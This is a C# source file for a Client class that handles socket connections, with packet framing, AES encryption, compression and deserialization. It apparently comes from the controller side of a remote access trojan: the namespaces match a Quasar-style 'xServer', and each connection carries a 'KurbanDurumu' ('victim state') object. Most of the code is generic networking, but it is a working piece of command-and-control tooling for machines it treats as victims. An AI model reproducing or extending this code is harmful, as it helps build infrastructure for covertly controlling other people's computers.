using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using xServer.KuuhakuCekirdek.Sıkıştırma;
using xServer.KuuhakuCekirdek.Kriptografi;
using xServer.KuuhakuCekirdek.Eklentiler;
using xServer.KuuhakuCekirdek.Paketler;

namespace xServer.KuuhakuCekirdek.Ağ
{
    public class Client : IEquatable<Client>
    {
        public event ClientStateEventHandler ClientState;

     
        public delegate void ClientStateEventHandler(Client s, bool connected);

      
        private void OnClientState(bool connected)
        {
            if (Connected == connected) return;

            Connected = connected;

            var handler = ClientState;
            if (handler != null)
            {
                handler(this, connected);
            }
        }
        public event ClientReadEventHandler ClientRead;

       
        public delegate void ClientReadEventHandler(Client s, IPacket packet);

       
        private void OnClientRead(IPacket packet)
        {
            var handler = ClientRead;
            if (handler != null)
            {
                handler(this, packet);
            }
        }

        public event ClientWriteEventHandler ClientWrite;

     
        public delegate void ClientWriteEventHandler(Client s, IPacket packet, long length, byte[] rawData);

      
        private void OnClientWrite(IPacket packet, long length, byte[] rawData)
        {
            var handler = ClientWrite;
            if (handler != null)
            {
                handler(this, packet, length, rawData);
            }
        }

      
        public bool Equals(Client c)
        {
            try
            {
                return this.EndPoint.Port.Equals(c.EndPoint.Port);
            }
            catch (Exception)
            {
                return false;
            }
        }

        public override bool Equals(object obj)
        {
            return this.Equals(obj as Client);
        }

      
        public override int GetHashCode()
        {
            return this.EndPoint.Port.GetHashCode();
        }

        public enum ReceiveType
        {
            Header,
            Payload
        }

        private Socket _handle;
        private readonly Queue<byte[]> _sendBuffers = new Queue<byte[]>();

        private bool _sendingPackets;
        private readonly object _sendingPacketsLock = new object();

        private readonly Queue<byte[]> _readBuffers = new Queue<byte[]>();

        private bool _readingPackets;
        private readonly object _readingPacketsLock = new object();

        private int _readOffset;
        private int _writeOffset;
        private int _tempHeaderOffset;
        private int _readableDataLen;
        private int _payloadLen;
        private ReceiveType _receiveState = ReceiveType.Header;

        public DateTime ConnectedTime { get; private set; }

        public bool Connected { get; private set; }

        public bool Authenticated { get; set; }
        public KurbanDurumu Value { get; set; }

 
        public IPEndPoint EndPoint { get; private set; }
        private readonly Server _parentServer;

        private byte[] _readBuffer;

        private byte[] _payloadBuffer;

        private byte[] _tempHeader;


        private bool _appendHeader;

        private const bool encryptionEnabled = true;
        private const bool compressionEnabled = true;

        public Client(Server parentServer, Socket socket)
        {
            try
            {
                _parentServer = parentServer;
                Initialize();

                _handle = socket;
                _handle.SetKeepAliveEx(_parentServer.KEEP_ALIVE_INTERVAL, _parentServer.KEEP_ALIVE_TIME);

                EndPoint = (IPEndPoint)_handle.RemoteEndPoint;
                ConnectedTime = DateTime.UtcNow;

                _readBuffer = _parentServer.BufferManager.GetBuffer();
                _tempHeader = new byte[_parentServer.HEADER_SIZE];

                _handle.BeginReceive(_readBuffer, 0, _readBuffer.Length, SocketFlags.None, AsyncReceive, null);
                OnClientState(true);
            }
            catch (Exception)
            {
                Disconnect();
            }
        }

        private void Initialize()
        {
            Authenticated = false;
            Value = new KurbanDurumu();
        }

        private void AsyncReceive(IAsyncResult result)
        {
            int bytesTransferred;

            try
            {
                bytesTransferred = _handle.EndReceive(result);

                if (bytesTransferred <= 0)
                    throw new Exception("no bytes transferred");
            }
            catch (NullReferenceException)
            {
                return;
            }
            catch (ObjectDisposedException)
            {
                return;
            }
            catch (Exception)
            {
                Disconnect();
                return;
            }

            _parentServer.BytesReceived += bytesTransferred;

            byte[] received = new byte[bytesTransferred];

            try
            {
                Array.Copy(_readBuffer, received, received.Length);
            }
            catch (Exception)
            {
                Disconnect();
                return;
            }

            lock (_readBuffers)
            {
                _readBuffers.Enqueue(received);
            }

            lock (_readingPacketsLock)
            {
                if (!_readingPackets)
                {
                    _readingPackets = true;
                    ThreadPool.QueueUserWorkItem(AsyncReceive);
                }
            }

            try
            {
                _handle.BeginReceive(_readBuffer, 0, _readBuffer.Length, SocketFlags.None, AsyncReceive, null);
            }
            catch (ObjectDisposedException)
            {
            }
            catch (Exception)
            {
                Disconnect();
            }
        }

        private void AsyncReceive(object state)
        {
            while (true)
            {
                byte[] readBuffer;
                lock (_readBuffers)
                {
                    if (_readBuffers.Count == 0)
                    {
                        lock (_readingPacketsLock)
                        {
                            _readingPackets = false;
                        }
                        return;
                    }

                    readBuffer = _readBuffers.Dequeue();
                }

                _readableDataLen += readBuffer.Length;
                bool process = true;
                while (process)
                {
                    switch (_receiveState)
                    {
                        case ReceiveType.Header:
                            {
                                if (_readableDataLen >= _parentServer.HEADER_SIZE)
                                {
                                    int headerLength = (_appendHeader)
                                        ? _parentServer.HEADER_SIZE - _tempHeaderOffset
                                        : _parentServer.HEADER_SIZE;

                                    try
                                    {
                                        if (_appendHeader)
                                        {
                                            try
                                            {
                                                Array.Copy(readBuffer, _readOffset, _tempHeader, _tempHeaderOffset,
                                                    headerLength);
                                            }
                                            catch (Exception)
                                            {
                                                process = false;
                                                Disconnect();
                                                break;
                                            }
                                            _payloadLen = BitConverter.ToInt32(_tempHeader, 0);
                                            _tempHeaderOffset = 0;
                                            _appendHeader = false;
                                        }
                                        else
                                        {
                                            _payloadLen = BitConverter.ToInt32(readBuffer, _readOffset);
                                        }

                                        if (_payloadLen <= 0 || _payloadLen > _parentServer.MAX_PACKET_SIZE)
                                            throw new Exception("invalid header");
                                    }
                                    catch (Exception)
                                    {
                                        process = false;
                                        Disconnect();
                                        break;
                                    }

                                    _readableDataLen -= headerLength;
                                    _readOffset += headerLength;
                                    _receiveState = ReceiveType.Payload;
                                }
                                else
                                {
                                    try
                                    {
                                        Array.Copy(readBuffer, _readOffset, _tempHeader, _tempHeaderOffset, _readableDataLen);
                                    }
                                    catch (Exception)
                                    {
                                        process = false;
                                        Disconnect();
                                        break;
                                    }
                                    _tempHeaderOffset += _readableDataLen;
                                    _appendHeader = true;
                                    process = false;
                                }
                                break;
                            }
                        case ReceiveType.Payload:
                            {
                                if (_payloadBuffer == null || _payloadBuffer.Length != _payloadLen)
                                    _payloadBuffer = new byte[_payloadLen];

                                int length = (_writeOffset + _readableDataLen >= _payloadLen)
                                    ? _payloadLen - _writeOffset
                                    : _readableDataLen;

                                try
                                {
                                    Array.Copy(readBuffer, _readOffset, _payloadBuffer, _writeOffset, length);
                                }
                                catch (Exception)
                                {
                                    process = false;
                                    Disconnect();
                                    break;
                                }

                                _writeOffset += length;
                                _readOffset += length;
                                _readableDataLen -= length;

                                if (_writeOffset == _payloadLen)
                                {
                                    bool isError = _payloadBuffer.Length == 0;

                                    if (!isError)
                                    {
                                        if (encryptionEnabled)
                                            _payloadBuffer = AES.Decrypt(_payloadBuffer);

                                        isError = _payloadBuffer.Length == 0;
                                    }

                                    if (!isError)
                                    {
                                        if (compressionEnabled)
                                        {
                                            try
                                            {
                                                _payloadBuffer = SafeQuickLZ.Decompress(_payloadBuffer);
                                            }
                                            catch (Exception)
                                            {
                                                process = false;
                                                Disconnect();
                                                break;
                                            }
                                        }

                                        isError = _payloadBuffer.Length == 0;
                                    }

                                    if (isError)
                                    {
                                        process = false;
                                        Disconnect();
                                        break;
                                    }

                                    using (MemoryStream deserialized = new MemoryStream(_payloadBuffer))
                                    {
                                        try
                                        {
                                            IPacket packet = (IPacket)_parentServer.Serializer.Deserialize(deserialized);

                                            OnClientRead(packet);
                                        }
                                        catch (Exception)
                                        {
                                            process = false;
                                            Disconnect();
                                            break;
                                        }
                                    }

                                    _receiveState = ReceiveType.Header;
                                    _payloadBuffer = null;
                                    _payloadLen = 0;
                                    _writeOffset = 0;
                                }

                                if (_readableDataLen == 0)
                                    process = false;

                                break;
                            }
                    }
                }

                if (_receiveState == ReceiveType.Header)
                {
                    _writeOffset = 0;
                }
                _readOffset = 0;
                _readableDataLen = 0;
            }
        }

        public void Send<T>(T packet) where T : IPacket
        {
            if (!Connected || packet == null) return;

            lock (_sendBuffers)
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    try
                    {
                        _parentServer.Serializer.Serialize(ms, packet);
                    }
                    catch (Exception)
                    {
                        Disconnect();
                        return;
                    }

                    byte[] payload = ms.ToArray();

                    _sendBuffers.Enqueue(payload);

                    OnClientWrite(packet, payload.LongLength, payload);

                    lock (_sendingPacketsLock)
                    {
                        if (_sendingPackets) return;

                        _sendingPackets = true;
                    }
                    ThreadPool.QueueUserWorkItem(Send);
                }
            }
        }

        public void SendBlocking<T>(T packet) where T : IPacket
        {
            Send(packet);
            while (_sendingPackets)
            {
                Thread.Sleep(10);
            }
        }

        private void Send(object state)
        {
            while (true)
            {
                if (!Connected)
                {
                    SendCleanup(true);
                    return;
                }

                byte[] payload;
                lock (_sendBuffers)
                {
                    if (_sendBuffers.Count == 0)
                    {
                        SendCleanup();
                        return;
                    }

                    payload = _sendBuffers.Dequeue();
                }

                try
                {
                    var packet = BuildPacket(payload);
                    _parentServer.BytesSent += packet.Length;
                    _handle.Send(packet);
                }
                catch (Exception)
                {
                    Disconnect();
                    SendCleanup(true);
                    return;
                }
            }
        }

        private byte[] BuildPacket(byte[] payload)
        {
            if (compressionEnabled)
                payload = SafeQuickLZ.Compress(payload);

            if (encryptionEnabled)
                payload = AES.Encrypt(payload);

            byte[] packet = new byte[payload.Length + _parentServer.HEADER_SIZE];
            Array.Copy(BitConverter.GetBytes(payload.Length), packet, _parentServer.HEADER_SIZE);
            Array.Copy(payload, 0, packet, _parentServer.HEADER_SIZE, payload.Length);
            return packet;
        }

        private void SendCleanup(bool clear = false)
        {
            lock (_sendingPacketsLock)
            {
                _sendingPackets = false;
            }

            if (!clear) return;

            lock (_sendBuffers)
            {
                _sendBuffers.Clear();
            }
        }

        public void Disconnect()
        {
            if (_handle != null)
            {
                _handle.Close();
                _handle = null;
                _readOffset = 0;
                _writeOffset = 0;
                _tempHeaderOffset = 0;
                _readableDataLen = 0;
                _payloadLen = 0;
                _payloadBuffer = null;
                _receiveState = ReceiveType.Header;

                if (Value != null)
                {
                    Value.Dispose();
                    Value = null;
                }

                _parentServer.BufferManager.ReturnBuffer(_readBuffer);
            }

            OnClientState(false);
        }
    }
}